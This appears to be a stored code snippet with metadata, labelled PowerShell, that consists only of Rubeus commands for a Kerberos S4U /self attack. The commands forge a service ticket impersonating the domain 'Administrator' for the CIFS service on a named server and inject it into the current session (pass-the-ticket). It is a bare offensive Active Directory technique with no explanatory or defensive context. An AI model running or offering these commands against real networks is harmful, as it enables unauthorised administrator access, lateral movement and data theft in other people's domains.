---
id: ed2536ed-3d7f-4159-b226-9e9b4a23e93c
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.821249+00:00'
updated_at: '2023-04-10T20:36:07.950743+00:00'
---

# Code Snippet ed2536ed

**Language**: ps1

```ps1
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
Rubeus.exe ptt /ticket:"base64ticket"

Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
```


